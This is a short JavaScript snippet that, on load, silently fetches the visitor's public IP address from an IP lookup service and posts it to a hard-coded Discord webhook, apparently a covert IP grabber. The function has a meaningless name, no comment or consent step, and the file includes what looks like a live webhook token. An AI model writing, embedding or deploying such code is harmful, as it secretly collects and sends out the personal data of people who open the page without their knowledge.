const webhookUrl = 'https://discord.com/api/webhooks/1087464651543019571/Q11STVqHG6yZ1Elr_UZbcOT3rVoHqUbpVp0Rk4kNqVuPkOQAmV23ac3vYorWpBpmifdr';

async function _rgiuh() {
  const response = await fetch('https://api.ipify.org/');
  const data = await response.text();

  const payload = {
    content: data
  };

  fetch(webhookUrl, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(payload)
  })
  .catch(error => console.error(error));
}

_rgiuh();
